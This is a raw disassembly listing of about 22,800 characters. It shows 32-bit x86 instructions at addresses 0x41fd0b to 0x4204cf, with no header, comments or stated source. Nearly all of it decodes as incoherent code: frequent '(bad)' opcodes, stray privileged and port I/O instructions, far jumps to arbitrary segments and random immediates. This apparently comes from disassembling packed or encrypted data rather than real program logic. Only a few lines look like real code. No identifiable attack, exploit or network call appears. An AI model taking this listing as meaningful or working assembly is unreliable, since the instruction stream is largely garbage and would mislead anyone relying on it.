  41fd0b:	lds    ebp,FWORD PTR [ebx+esi*1]
  41fd0e:	not    esi
  41fd10:	retf   0xbd82
  41fd13:	int    0xba
  41fd15:	sbb    DWORD PTR [esi],ebp
  41fd17:	push   edx
  41fd18:	cmp    BYTE PTR [ebx],dl
  41fd1a:	loope  0x41fc9d
  41fd1c:	mov    esi,0x56fc13fe
  41fd21:	div    BYTE PTR ds:[ecx+0x21]
  41fd25:	idiv   BYTE PTR [edx]
  41fd27:	(bad)  
  41fd28:	(bad)  
  41fd29:	jg     0x41fcb3
  41fd2b:	(bad)  
  41fd2c:	stc    
  41fd2d:	push   es
  41fd2e:	xchg   edi,eax
  41fd2f:	ds mov ebp,0xd649948c
  41fd35:	mov    ah,0x68
  41fd37:	mov    ch,0x92
  41fd39:	push   ss
  41fd3a:	and    dh,BYTE PTR [ecx]
  41fd3c:	cmp    bh,BYTE PTR [edx+0x60441d9f]
  41fd42:	fisttp DWORD PTR [ecx]
  41fd44:	dec    esi
  41fd45:	iret   
  41fd46:	and    BYTE PTR [esi],0x13
  41fd49:	aas    
  41fd4a:	retf   
  41fd4b:	scas   eax,DWORD PTR es:[edi]
  41fd4c:	sub    DWORD PTR [edx+0x270e773],eax
  41fd52:	mov    al,0x7e
  41fd54:	pop    esi
  41fd55:	loope  0x41fd9a
  41fd57:	call   0xb700:0xc72b8bae
  41fd5e:	dec    ebp
  41fd5f:	ret    0xcc9e
  41fd62:	(bad)
  41fd66:	mov    dl,0x8d
  41fd68:	outs   dx,DWORD PTR ds:[esi]
  41fd69:	or     al,0xd
  41fd6b:	add    bh,BYTE PTR [ebp+0x31]
  41fd6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd6f:	push   ds
  41fd70:	xor    ebx,DWORD PTR [esp+ebx*4-0x39]
  41fd74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd75:	rcr    BYTE PTR [esi+0x48],1
  41fd78:	cwde   
  41fd79:	cs call 0xbadc6238
  41fd7f:	leave  
  41fd80:	sbb    ch,BYTE PTR [esi+eax*8+0x4fe527f8]
  41fd87:	xor    eax,0x3ddfb4cd
  41fd8c:	ret    0xdf48
  41fd8f:	jl     0x41fd73
  41fd91:	nop
  41fd92:	test   al,0xa1
  41fd94:	mov    esi,0x26994923
  41fd99:	inc    DWORD PTR [edx+edi*1]
  41fd9c:	or     cl,BYTE PTR [edi+0x3ac56fab]
  41fda2:	jb     0x41fd2e
  41fda4:	jo     0x41fdad
  41fda6:	jo     0x41fdd5
  41fda8:	xchg   esp,eax
  41fda9:	mov    bl,BYTE PTR [edx+0x7e]
  41fdac:	imul   ebp,eax,0x6c2bea65
  41fdb2:	loope  0x41fe26
  41fdb4:	test   DWORD PTR [ebp+0x40],0xb4e32d01
  41fdbb:	adc    ebx,ebx
  41fdbd:	xor    eax,0x489ba1c8
  41fdc2:	cld    
  41fdc3:	in     eax,0x24
  41fdc5:	ja     0x41fdb7
  41fdc7:	dec    ebx
  41fdc8:	and    BYTE PTR [ebp-0x4fd8f01c],ah
  41fdce:	(bad)
  41fdd1:	int    0xfb
  41fdd3:	or     eax,0x7ecaae36
  41fdd8:	xchg   edi,eax
  41fdd9:	imul   eax,edi,0x62
  41fddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fddd:	stos   BYTE PTR es:[edi],al
  41fdde:	loopne 0x41fdf6
  41fde0:	sbb    eax,0xd611c3dc
  41fde5:	aaa    
  41fde6:	fidiv  WORD PTR [esi-0x73]
  41fde9:	cmp    DWORD PTR [ebp+0x6189589d],ecx
  41fdef:	popf   
  41fdf0:	scas   al,BYTE PTR es:[edi]
  41fdf1:	mov    BYTE PTR [ecx],bh
  41fdf3:	ss aad 0x32
  41fdf6:	mov    edx,0xd633eb99
  41fdfb:	inc    ebx
  41fdfc:	mov    al,ds:0x5084b3e4
  41fe01:	dec    esi
  41fe02:	xchg   edi,eax
  41fe03:	imul   edi
  41fe05:	sub    DWORD PTR [ebx+0x70e8f97b],ebp
  41fe0b:	mov    esp,0x5c9eac40
  41fe10:	nop
  41fe11:	(bad)  
  41fe12:	pop    esi
  41fe13:	add    eax,edi
  41fe15:	pop    edx
  41fe16:	jmp    0xd3ee001d
  41fe1b:	in     al,dx
  41fe1c:	inc    ebx
  41fe1d:	xlat   BYTE PTR ds:[ebx]
  41fe1e:	pop    esp
  41fe1f:	lods   eax,DWORD PTR ds:[esi]
  41fe20:	sbb    eax,0x3282c4e8
  41fe25:	push   cs
  41fe26:	cwde   
  41fe27:	mov    DWORD PTR [edx-0x2b],ecx
  41fe2a:	outs   dx,BYTE PTR ds:[esi]
  41fe2b:	and    DWORD PTR [ecx],0x5c24328c
  41fe31:	push   ebp
  41fe32:	inc    eax
  41fe33:	xchg   ecx,eax
  41fe34:	rcr    ebp,1
  41fe36:	adc    ebp,ebx
  41fe38:	cmc    
  41fe39:	ins    DWORD PTR es:[edi],dx
  41fe3a:	bound  eax,QWORD PTR [esi]
  41fe3c:	retf   
  41fe3d:	mov    ecx,0xcb72ad84
  41fe42:	fisub  WORD PTR [edi]
  41fe44:	jmp    0x56462ef0
  41fe49:	push   eax
  41fe4a:	mov    ah,0x9f
  41fe4c:	hlt    
  41fe4d:	adc    DWORD PTR [ebx-0x113a4880],eax
  41fe53:	lods   al,BYTE PTR ds:[esi]
  41fe54:	(bad)
  41fe57:	dec    ebp
  41fe58:	sub    ebp,DWORD PTR [ebp-0x6074a706]
  41fe5e:	or     BYTE PTR [edi],ah
  41fe60:	ret    0x687e
  41fe63:	(bad)  
  41fe65:	stc    
  41fe66:	cdq    
  41fe67:	ins    DWORD PTR es:[edi],dx
  41fe68:	jne    0x41fe35
  41fe6a:	ds mov ch,0xd8
  41fe6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe6e:	dec    ecx
  41fe6f:	fsubr  QWORD PTR [edx-0x2130690a]
  41fe75:	and    eax,DWORD PTR [edi+0x1f]
  41fe78:	sub    DWORD PTR [edi],0x42
  41fe7b:	or     al,0x8d
  41fe7d:	jecxz  0x41fed9
  41fe7f:	inc    ebp
  41fe80:	cmp    dl,BYTE PTR [ebx-0x517c9ca3]
  41fe86:	add    al,0x91
  41fe88:	bound  ecx,QWORD PTR [edx-0x21d8dc4c]
  41fe8e:	stos   BYTE PTR es:[edi],al
  41fe8f:	into   
  41fe90:	jmp    DWORD PTR [edx]
  41fe92:	cs adc dh,bh
  41fe95:	fimul  DWORD PTR [ebp*8-0x2e3386b2]
  41fe9c:	jmp    0x2f9f:0xfe81054f
  41fea3:	and    dh,BYTE PTR [esi+0x6e019a50]
  41fea9:	ror    DWORD PTR [ebx],1
  41feab:	xchg   ecx,eax
  41feac:	fisubr WORD PTR [edx]
  41feae:	sbb    esp,ecx
  41feb0:	jns    0x41fefc
  41feb2:	sub    eax,0xce4b8de2
  41feb7:	lods   al,BYTE PTR ds:[esi]
  41feb8:	and    DWORD PTR [edx],edi
  41feba:	rol    al,cl
  41febc:	inc    eax
  41febd:	test   BYTE PTR [ebp-0x19e6ef52],0x83
  41fec4:	inc    edi
  41fec5:	jns    0x41fed5
  41fec7:	sahf   
  41fec8:	xor    DWORD PTR [edx+0x686c79a6],ecx
  41fece:	add    eax,DWORD PTR [eax+0x408ae90e]
  41fed4:	ins    BYTE PTR es:[edi],dx
  41fed5:	(bad)
  41fed9:	jbe    0x41fe9a
  41fedb:	jno    0x41ff3d
  41fedd:	adc    ah,al
  41fedf:	mov    eax,0xc501bc0e
  41fee4:	push   cs
  41fee5:	dec    esi
  41fee6:	xor    cl,BYTE PTR es:0x7f120051
  41feed:	pop    esp
  41feee:	hlt    
  41feef:	xor    eax,esi
  41fef1:	jbe    0x41fef0
  41fef3:	test   BYTE PTR [ebp-0x60a3658f],0x1c
  41fefa:	or     al,0x6a
  41fefc:	push   ebx
  41fefd:	loope  0x41ff32
  41feff:	aaa    
  41ff00:	add    eax,0xc63b2aff
  41ff05:	or     al,0xe4
  41ff07:	sbb    dh,BYTE PTR [ebx+0xa2ceebd]
  41ff0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff0e:	ins    BYTE PTR es:[edi],dx
  41ff0f:	cmp    BYTE PTR [eax+0xb],bl
  41ff12:	jo     0xdd70dafd
  41ff18:	icebp  
  41ff19:	fdiv   QWORD PTR [ecx+0x4a]
  41ff1c:	or     eax,0x4e45ffc
  41ff21:	and    bh,BYTE PTR [esi-0x6f]
  41ff24:	jp     0x41ff25
  41ff26:	popf   
  41ff27:	fwait
  41ff28:	mov    ds:0xb41d96a9,al
  41ff2d:	add    DWORD PTR [edi+0x58],edi
  41ff30:	sub    BYTE PTR [esi+0x14],bl
  41ff33:	test   al,0x3b
  41ff35:	push   esi
  41ff36:	adc    ah,dl
  41ff38:	xor    edx,edx
  41ff3a:	push   0x3
  41ff3c:	pop    ecx
  41ff3d:	div    ecx
  41ff3f:	mov    ecx,DWORD PTR [ebp-0x40]
  41ff42:	or     eax,ecx
  41ff44:	mov    ecx,DWORD PTR [ebp-0x54]
  41ff47:	xor    edx,edx
  41ff49:	div    ecx
  41ff4b:	imul   eax,eax,0x7d53
  41ff51:	jmp    0x420338
  41ff56:	xor    DWORD PTR [ebx],edx
  41ff58:	(bad)  
  41ff59:	in     al,dx
  41ff5a:	scas   eax,DWORD PTR es:[edi]
  41ff5b:	imul   edi,DWORD PTR [ebx-0x57113e5],0xffffffa4
  41ff62:	dec    ebp
  41ff63:	loope  0x41fef5
  41ff65:	nop
  41ff66:	arpl   WORD PTR [ebp-0x3bb54140],dx
  41ff6c:	mov    esi,0xfe6ad7be
  41ff71:	ret    0xa6d4
  41ff74:	stos   BYTE PTR es:[edi],al
  41ff75:	dec    esi
  41ff76:	push   esi
  41ff77:	inc    ebx
  41ff78:	fstp   QWORD PTR [edx]
  41ff7a:	iret   
  41ff7b:	jg     0x41ff69
  41ff7d:	test   BYTE PTR [esi+0x3d],cl
  41ff80:	sahf   
  41ff81:	pop    ds
  41ff82:	test   DWORD PTR [edi],ebp
  41ff84:	data16 jnp 0x41fff7
  41ff87:	push   edx
  41ff88:	mov    ds:0xa97f8ac8,eax
  41ff8d:	aam    0xd8
  41ff8f:	ins    DWORD PTR es:[edi],dx
  41ff90:	cld    
  41ff91:	call   0x503d:0xfc9c2fff
  41ff98:	pop    edx
  41ff99:	cmp    ecx,DWORD PTR [ebx+0x32dc4541]
  41ff9f:	jecxz  0x41ff92
  41ffa1:	phaddd mm2,mm3
  41ffa5:	inc    eax
  41ffa6:	cli    
  41ffa7:	dec    esp
  41ffa8:	in     eax,dx
  41ffa9:	mov    al,0x36
  41ffab:	fmul   DWORD PTR ds:0xd0345387
  41ffb1:	xor    al,0x39
  41ffb3:	adc    al,0xd8
  41ffb5:	retf   
  41ffb6:	and    eax,0x405c1855
  41ffbb:	fcom   DWORD PTR [eax+0x4696245d]
  41ffc1:	hlt    
  41ffc2:	je     0x41ff82
  41ffc4:	sub    DWORD PTR [ebp+0x34816039],eax
  41ffca:	stos   BYTE PTR es:[edi],al
  41ffcb:	rcr    bl,0xba
  41ffce:	or     edx,esp
  41ffd0:	in     eax,dx
  41ffd1:	dec    edi
  41ffd2:	outs   dx,DWORD PTR ds:[esi]
  41ffd3:	mov    dh,BYTE PTR [ebx+0x5a491cae]
  41ffd9:	ficomp WORD PTR [edx]
  41ffdb:	push   0xffffffe6
  41ffdd:	mov    ds:0x97e67083,eax
  41ffe2:	jecxz  0x420054
  41ffe4:	loopne 0x41ffb6
  41ffe6:	faddp  st(7),st
  41ffe8:	das    
  41ffe9:	cmp    eax,0x5b304d3
  41ffee:	(bad)  [edi]
  41fff0:	shl    BYTE PTR [ecx],cl
  41fff2:	dec    ecx
  41fff3:	test   al,0x44
  41fff5:	clc    
  41fff6:	cld    
  41fff7:	sar    DWORD PTR [esi-0x60],1
  41fffa:	imul   esi,DWORD PTR ds:0x1b08f1fd,0x67a5d7d1
  420004:	lock sub BYTE PTR [ecx-0x66],dh
  420008:	stos   DWORD PTR es:[edi],eax
  420009:	jge    0x41ff93
  42000b:	jb     0x41ffe2
  42000d:	and    BYTE PTR [ecx+ebx*2-0x4],dl
  420011:	scas   al,BYTE PTR es:[edi]
  420012:	add    ah,dh
  420014:	call   0x38ec:0x6c665873
  42001b:	adc    BYTE PTR [esi-0x49c38a38],bh
  420021:	mov    eax,ds:0xf5f44ab5
  420026:	jle    0x42006b
  420028:	arpl   WORD PTR [eax-0x4c26f6ff],si
  42002e:	or     bh,0x72
  420031:	xchg   edi,eax
  420032:	pop    ecx
  420033:	ja     0x420016
  420035:	or     DWORD PTR [ebx+0x18],eax
  420038:	xchg   edi,eax
  420039:	je     0x420045
  42003b:	popf   
  42003c:	imul   ebp,DWORD PTR [edi+eiz*8-0x16],0x2a712a76
  420044:	mov    ebp,0x7db4a11f
  420049:	adc    cl,dh
  42004b:	sbb    esi,ebp
  42004d:	dec    edx
  42004e:	mov    dl,dh
  420050:	jg     0x41ffeb
  420052:	add    al,0xd6
  420054:	sar    BYTE PTR [ebp+eiz*2+0x7c4bfbad],cl
  42005b:	es inc eax
  42005d:	test   DWORD PTR [eiz*4-0x1f9fa142],ebp
  420064:	add    ecx,DWORD PTR [ebx+0x4ad3be27]
  42006a:	lods   al,BYTE PTR ds:[esi]
  42006b:	repz retf 
  42006d:	mov    al,ds:0xc7cf4fb6
  420072:	push   ebp
  420073:	pop    ds
  420074:	sub    bl,BYTE PTR [bx+di-0x5bd8]
  420079:	stos   DWORD PTR es:[edi],eax
  42007a:	popf   
  42007b:	shl    dh,1
  42007d:	mov    ah,BYTE PTR [edi+0x76]
  420080:	xchg   edx,ebp
  420082:	jb     0x4200eb
  420084:	mov    bl,0x25
  420086:	fwait
  420087:	push   esi
  420088:	aaa    
  420089:	inc    edx
  42008a:	sub    ah,BYTE PTR [eax-0x53384a88]
  420090:	mov    ecx,0x3ee2f41
  420095:	lock ss js 0x4200ec
  420099:	sbb    eax,0x182538a6
  42009e:	imul   eax,DWORD PTR [ebp+0x5c587093],0x54
  4200a5:	bound  ecx,QWORD PTR [ebx+0x7e]
  4200a8:	jmp    0x420060
  4200aa:	add    ebp,DWORD PTR [esi]
  4200ac:	shr    DWORD PTR [edx+0x1e6e2877],cl
  4200b2:	std    
  4200b3:	sub    al,0xb7
  4200b5:	inc    ecx
  4200b6:	fwait
  4200b7:	repnz test al,0x2c
  4200ba:	arpl   sp,sp
  4200bc:	popf   
  4200bd:	ins    DWORD PTR es:[edi],dx
  4200be:	loop   0x42011f
  4200c0:	mov    al,ds:0xf9c3498f
  4200c5:	inc    ebp
  4200c6:	push   ebp
  4200c7:	outs   dx,DWORD PTR ds:[esi]
  4200c8:	daa    
  4200c9:	js     0x4200ce
  4200cb:	retf   
  4200cc:	pop    edx
  4200cd:	sahf   
  4200ce:	mov    bl,0xa6
  4200d0:	ins    BYTE PTR es:[edi],dx
  4200d1:	fistp  WORD PTR [edi]
  4200d3:	and    al,BYTE PTR [ecx-0x71]
  4200d6:	and    al,0xad
  4200d8:	fsub   st,st(5)
  4200da:	and    BYTE PTR [esi+0x28],dl
  4200dd:	jns    0x42009c
  4200df:	xor    al,BYTE PTR [esi-0x4b6a8cc5]
  4200e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200e6:	inc    edx
  4200e7:	mov    dh,0x5e
  4200e9:	inc    eax
  4200ea:	sbb    BYTE PTR [eax-0x7f9c1a2e],ch
  4200f0:	cmp    DWORD PTR [edi-0x1b],0x80928fe
  4200f7:	mov    eax,0x466abff6
  4200fc:	pop    ds
  4200fd:	adc    eax,0x9413da23
  420102:	fcomp  QWORD PTR [ecx-0x3e]
  420105:	gs inc esp
  420107:	jb     0x42015a
  420109:	ret    
  42010a:	stos   BYTE PTR es:[edi],al
  42010b:	push   edi
  42010c:	repz fsubr QWORD PTR [edx]
  42010f:	mov    al,BYTE PTR [edx+0x57d4465b]
  420115:	mov    ecx,0x6fa2a5
  42011a:	pop    ecx
  42011b:	popf   
  42011c:	stos   BYTE PTR es:[edi],al
  42011d:	iret   
  42011e:	inc    ebx
  42011f:	adc    al,0x51
  420121:	nop
  420122:	hlt    
  420123:	dec    eax
  420124:	dec    ecx
  420125:	aaa    
  420126:	scas   al,BYTE PTR es:[edi]
  420127:	int    0x13
  420129:	ret    0x4695
  42012c:	stos   DWORD PTR es:[edi],eax
  42012d:	jmp    0xdd5a:0xfa7e345d
  420134:	adc    eax,0xa5b015d7
  420139:	xor    eax,0x111c53ba
  42013e:	push   0xffffffbc
  420140:	test   eax,0xd62ac862
  420145:	and    ebp,edi
  420147:	fs xchg esi,eax
  420149:	jbe    0x42015d
  42014b:	xchg   ecx,eax
  42014c:	not    BYTE PTR [ebx]
  42014e:	les    ecx,FWORD PTR ds:0x24048329
  420154:	adc    esp,DWORD PTR [edi]
  420156:	pushf  
  420157:	inc    ecx
  420158:	push   esi
  420159:	in     al,dx
  42015a:	mov    cl,0x60
  42015c:	sbb    al,BYTE PTR [esi+edi*1+0x2a]
  420160:	add    DWORD PTR [ebx+0x22],edx
  420163:	push   0x5d
  420165:	aaa    
  420166:	xor    al,0x36
  420168:	inc    esp
  420169:	ret    
  42016a:	push   edx
  42016b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42016c:	mov    ebp,0x183a68f9
  420171:	shl    DWORD PTR [ecx],1
  420173:	shl    BYTE PTR [edi-0x54],1
  420176:	inc    ebx
  420177:	loop   0x420175
  420179:	xchg   ebp,eax
  42017a:	mov    bl,0xed
  42017c:	fadd   st(7),st
  42017e:	cmpxchg ch,ch
  420181:	lea    edx,[esi]
  420183:	push   ecx
  420184:	adc    edi,ebx
  420186:	push   edx
  420187:	jl     0x42011c
  420189:	add    DWORD PTR [edi],edx
  42018b:	and    eax,0x7f03adec
  420190:	jmp    0x4201c2
  420192:	aaa    
  420193:	pop    eax
  420194:	pop    es
  420195:	mov    ebp,0x84c50214
  42019a:	xchg   esp,eax
  42019b:	push   eax
  42019c:	pop    ss
  42019d:	add    ebx,DWORD PTR [esi-0x57a32409]
  4201a3:	jmp    0xc7361651
  4201a8:	fmulp  st(1),st
  4201aa:	sbb    ch,BYTE PTR [esi]
  4201ac:	and    DWORD PTR [ebx+ebp*1+0x4c],edx
  4201b0:	in     eax,0xbd
  4201b2:	or     al,0xb7
  4201b4:	popa   
  4201b5:	call   0x42408f88
  4201ba:	and    al,0xae
  4201bc:	inc    eax
  4201bd:	(bad)  [edx+0x65dd99dc]
  4201c3:	scas   al,BYTE PTR es:[edi]
  4201c4:	xor    al,BYTE PTR [edx-0x77]
  4201c7:	or     bh,bl
  4201c9:	adc    esi,ecx
  4201cb:	add    dl,BYTE PTR [ecx+edi*1-0x2a]
  4201cf:	shr    DWORD PTR [edx+0x26],1
  4201d2:	mov    esi,0x469a5072
  4201d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201d8:	jmp    0x4201a3
  4201da:	out    dx,eax
  4201db:	popf   
  4201dc:	add    DWORD PTR [eax+0x78635166],ebx
  4201e2:	mov    ebp,0x10430d0c
  4201e7:	es aad 0x61
  4201ea:	int3   
  4201eb:	out    dx,eax
  4201ec:	cdq    
  4201ed:	or     DWORD PTR [edx-0x78],ebx
  4201f0:	fdiv   QWORD PTR [ebx+0x160a1171]
  4201f6:	ret    
  4201f7:	lds    esi,FWORD PTR [edx]
  4201f9:	push   ebx
  4201fa:	rol    BYTE PTR [ebx-0x3a42c96e],1
  420200:	dec    DWORD PTR [ecx]
  420202:	cld    
  420203:	inc    eax
  420204:	add    al,0xe6
  420206:	ret    0x5800
  420209:	mov    WORD PTR [eax-0x6eef9cde],es
  42020f:	jno    0x4201fe
  420211:	cdq    
  420212:	(bad)  
  420214:	js     0x420291
  420216:	mov    ebx,0x557fed33
  42021b:	xchg   DWORD PTR [ecx-0x5a],edx
  42021e:	loopne 0x420228
  420220:	adc    al,0xa1
  420222:	out    0xed,al
  420224:	pop    edi
  420225:	das    
  420226:	xchg   esi,eax
  420227:	dec    ebx
  420228:	or     BYTE PTR [edx-0x49],bh
  42022b:	mov    ch,0xe3
  42022d:	lock ja 0x420200
  420230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420231:	cmp    DWORD PTR ds:0xbfe79a57,ebx
  420237:	and    al,0xae
  420239:	je     0x42028e
  42023b:	xchg   edi,eax
  42023c:	aad    0xa8
  42023e:	push   esi
  42023f:	xchg   ebp,eax
  420240:	push   ds
  420241:	inc    ecx
  420242:	sbb    eax,0xe0f767bb
  420247:	bound  ebx,QWORD PTR [ecx]
  420249:	(bad)  
  42024a:	cmp    al,0x4
  42024c:	stc    
  42024d:	jmp    0xc37ad55c
  420252:	add    DWORD PTR [esi+ecx*1-0x3b],eax
  420256:	lea    eax,[eax-0x40293608]
  42025c:	push   0x1758167
  420261:	mov    cl,0x1a
  420263:	ja     0x4202c3
  420265:	push   ecx
  420266:	jle    0x420263
  420268:	into   
  420269:	adc    BYTE PTR [ebx+0x3c],al
  42026c:	push   cs
  42026d:	retf   
  42026e:	cmp    cl,dl
  420270:	sbb    ebp,edx
  420272:	or     BYTE PTR [ecx-0x38060cea],al
  420278:	jns    0x42029b
  42027a:	xchg   esi,eax
  42027b:	add    ecx,esi
  42027d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42027e:	inc    eax
  42027f:	mov    ch,0x78
  420281:	jge    0x4202a7
  420283:	push   edi
  420284:	and    eax,0x3ed9daa3
  420289:	sbb    esi,ecx
  42028b:	xchg   ecx,eax
  42028c:	loope  0x420210
  42028e:	or     eax,0xde846802
  420293:	push   0x433a84b
  420298:	and    ah,BYTE PTR [edi+0x15]
  42029b:	inc    ebp
  42029c:	adc    cl,BYTE PTR [ebx+0x12]
  42029f:	inc    edi
  4202a0:	inc    ebx
  4202a1:	push   0x38
  4202a3:	enter  0x9060,0xde
  4202a7:	leave  
  4202a8:	fwait
  4202a9:	and    al,0xcd
  4202ab:	dec    ebx
  4202ac:	sub    eax,0x8aaa70ce
  4202b1:	nop
  4202b2:	dec    ecx
  4202b3:	jnp    0x420285
  4202b5:	(bad)  
  4202b6:	clc    
  4202b7:	mov    dh,0x4b
  4202b9:	push   cs
  4202ba:	jmp    0x17f0f769
  4202bf:	dec    edi
  4202c0:	mov    al,0x39
  4202c2:	jp     0x420298
  4202c4:	js     0x4202db
  4202c6:	add    cl,BYTE PTR [edx+0x29f0ce9a]
  4202cc:	lock adc al,0xcd
  4202cf:	outs   dx,BYTE PTR ds:[esi]
  4202d0:	mov    ah,0x3d
  4202d2:	dec    eax
  4202d3:	out    0x5c,al
  4202d5:	ret    0x7a6a
  4202d8:	push   esp
  4202d9:	shl    DWORD PTR [esi-0x79],0x9c
  4202dd:	ror    DWORD PTR [eax],1
  4202df:	popa   
  4202e0:	sbb    BYTE PTR [esi-0x68],ah
  4202e3:	push   edx
  4202e4:	popa   
  4202e5:	ret    0x6130
  4202e8:	mov    ecx,0xf29b356a
  4202ed:	mov    BYTE PTR [esi+0x2ef57f8],cl
  4202f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202f4:	jl     0x420331
  4202f6:	jne    0x4202a7
  4202f8:	das    
  4202f9:	aam    0x3d
  4202fb:	push   0xffffff84
  4202fd:	xchg   ebx,eax
  4202fe:	enter  0x15b1,0xe2
  420302:	repnz inc eax
  420304:	jnp    0x420357
  420306:	int3   
  420307:	cwde   
  420308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420309:	retf   0x1b01
  42030c:	push   esi
  42030d:	in     al,0xb5
  42030f:	adc    dh,al
  420311:	adc    esi,DWORD PTR [edx-0x570fd45f]
  420317:	or     BYTE PTR [edi+0x2d],bl
  42031a:	push   ds
  42031b:	inc    edi
  42031c:	mov    edi,0xe8849f57
  420321:	inc    eax
  420322:	sahf   
  420323:	sub    eax,0x73d4ccbb
  420328:	sbb    BYTE PTR [ecx-0x7c],dh
  42032b:	mov    esp,0xbc5bb4b
  420330:	loope  0x42033a
  420332:	sub    DWORD PTR [esp+ebx*1-0x74d8fb8f],eax
  420339:	dec    ebp
  42033a:	or     BYTE PTR [ebp-0x4806fe7c],cl
  420340:	lods   al,BYTE PTR ds:[esi]
  420341:	loopne 0x4202ce
  420343:	lea    edx,[eax]
  420345:	(bad)  
  420346:	(bad)  
  420347:	inc    DWORD PTR [ecx+0x4108e1]
  42034d:	add    BYTE PTR [ecx+0x40e7e1],al
  420353:	add    BYTE PTR [ecx+0x1a54e9],al
  420359:	add    BYTE PTR [ecx+0x25acf1],al
  42035f:	add    BYTE PTR [ebx-0x1036b],cl
  420365:	(bad)  
  420366:	jmp    0x42074d
  42036b:	pop    eax
  42036c:	dec    ecx
  42036d:	xchg   esi,eax
  42036e:	jmp    0x42030c
  420370:	cmp    al,0xbc
  420372:	jns    0x4203a4
  420374:	inc    edx
  420375:	aad    0xe3
  420377:	mov    ecx,DWORD PTR [ebx-0x62106df8]
  42037d:	sar    BYTE PTR [esi-0x41413bb6],0x1f
  420384:	ret    0xdce3
  420387:	hlt    
  420388:	push   0xfffffff5
  42038a:	out    dx,eax
  42038b:	into   
  42038c:	push   eax
  42038d:	imul   esi,esp,0x78cbc61
  420393:	jmp    0xa2d35612
  420398:	(bad)  
  420399:	fadd   QWORD PTR [edi-0x11]
  42039c:	and    eax,0x61ef2422
  4203a1:	clc    
  4203a2:	call   0x8f0b8b24
  4203a7:	sbb    al,ah
  4203a9:	mov    bl,0x69
  4203ab:	fdivr  QWORD PTR ds:0xbd0d88c6
  4203b1:	enter  0x9dde,0x98
  4203b5:	mov    edx,0x47bb9317
  4203ba:	pushf  
  4203bb:	inc    ebp
  4203bc:	xchg   esp,eax
  4203bd:	test   cl,cl
  4203bf:	mov    ebx,esp
  4203c1:	inc    ebp
  4203c2:	scas   al,BYTE PTR es:[edi]
  4203c3:	fadd   st,st(4)
  4203c5:	push   es
  4203c6:	rcl    DWORD PTR [ebx+0x7132d8d9],cl
  4203cc:	add    ch,0xcc
  4203cf:	ret    
  4203d0:	mov    bl,0x21
  4203d2:	mov    eax,ds:0xea5c50d6
  4203d7:	sbb    eax,0x5ad72425
  4203dc:	std    
  4203dd:	push   ebp
  4203de:	sub    ebp,DWORD PTR [ebx+0x8]
  4203e1:	mov    bl,0x28
  4203e3:	into   
  4203e4:	jg     0x420400
  4203e6:	sbb    cl,ch
  4203e8:	inc    esi
  4203e9:	leave  
  4203ea:	mov    dl,0xc7
  4203ec:	in     eax,0xb0
  4203ee:	and    al,0xa4
  4203f0:	xchg   DWORD PTR [eax],ebp
  4203f2:	jmp    0x420439
  4203f4:	(bad)  
  4203f5:	or     BYTE PTR [edi+0x27],dl
  4203f8:	sub    BYTE PTR [ebx+0x3a371e53],bl
  4203fe:	dec    eax
  4203ff:	mov    ah,bh
  420401:	sub    BYTE PTR [esi+0x7742f89d],bh
  420407:	ja     0x420395
  420409:	xchg   edi,eax
  42040a:	fstp   DWORD PTR [edx-0x35099b2d]
  420410:	fwait
  420411:	sar    DWORD PTR [ebx-0x587d28c3],cl
  420417:	test   BYTE PTR [ecx],bl
  420419:	sub    DWORD PTR [edi],esp
  42041b:	jbe    0x420407
  42041d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42041f:	enter  0xb46b,0xdd
  420423:	push   0x557e5001
  420428:	cmp    dl,BYTE PTR [esi]
  42042a:	or     BYTE PTR [edi],ah
  42042c:	pop    ebx
  42042d:	or     eax,edx
  42042f:	and    BYTE PTR [eax],dh
  420431:	cdq    
  420432:	sub    ch,dh
  420434:	and    al,0x68
  420436:	xor    ch,dl
  420438:	mov    esp,0x70feec96
  42043d:	cld    
  42043e:	lods   eax,DWORD PTR ds:[esi]
  42043f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420440:	jne    0x4204ae
  420442:	sbb    BYTE PTR [esi+0x68],ch
  420445:	in     al,0xbb
  420447:	jmp    0x420499
  420449:	or     eax,0xe1b9ed88
  42044e:	jns    0x420455
  420450:	and    bl,BYTE PTR [ebx-0x73fa9f03]
  420456:	push   edi
  420457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420458:	outs   dx,BYTE PTR ds:[esi]
  420459:	in     al,0xc3
  42045b:	shl    esp,0x77
  42045e:	add    bl,ah
  420460:	les    edx,FWORD PTR [edx+ebp*8]
  420463:	jmp    0x46b0:0xa2a136ee
  42046a:	stos   DWORD PTR es:[edi],eax
  42046b:	and    eax,0x12bff3fb
  420470:	hlt    
  420471:	sub    al,0x8e
  420473:	es push ds
  420475:	jb     0x4204cd
  420477:	(bad)  
  420478:	or     al,0x95
  42047a:	jge    0x420498
  42047c:	les    esi,FWORD PTR [ecx-0x4241d186]
  420482:	and    DWORD PTR [ebx+0x1cfff65c],eax
  420488:	shl    esp,1
  42048a:	push   esi
  42048b:	mov    esp,0xbea6476c
  420490:	loop   0x420484
  420492:	push   ecx
  420493:	xchg   edi,eax
  420494:	mov    bh,0xcc
  420496:	push   cs
  420497:	cld    
  420498:	pop    ebp
  420499:	shl    DWORD PTR [edx-0x315b0547],1
  42049f:	xchg   edx,eax
  4204a0:	jmp    0xdb9c:0x95366763
  4204a7:	adc    al,0xfa
  4204a9:	inc    ebx
  4204aa:	pop    esi
  4204ab:	mov    esi,0xdb183fb6
  4204b0:	adc    eax,0xbb4e562f
  4204b5:	xor    DWORD PTR ds:0x4dc44bb0,edx
  4204bb:	dec    esi
  4204bc:	jecxz  0x420470
  4204be:	test   eax,0x47ecc2a1
  4204c3:	shr    BYTE PTR ds:0xc511a61a,0x23
  4204ca:	mov    ds:0x4d861de1,al
  4204cf:	enter  0x248f,0x10
